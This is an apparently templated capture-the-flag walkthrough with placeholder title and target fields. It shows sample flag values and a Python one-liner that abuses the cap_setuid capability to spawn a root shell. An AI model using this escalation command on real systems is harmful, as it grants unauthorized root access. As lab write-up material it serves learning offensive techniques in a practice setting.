---
title: "{{Title}}"
tags: []
created: "{{Date}}"
---
# {{Title}} Walkthrough

## Target Information

- **IP Address:** 
- **Difficulty:**

## Enumeration & Initial Access

Performing an **Nmap scan** reveals open ports and running services:

```bash

```



Inside the files, we find the **user flag**:

```bash
cat user.flag
8f924ea0b473ca1215c0191f24099c8a
```

## Privilege Escalation & Root Access


### Exploiting Capabilities for Root

Using `cap_setuid`, we escalate privileges to **root**:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

Retrieving the **root flag**:

```bash
cat /root/root.flag
8ee2f68678e4e18184b49c7e2fc80b93
```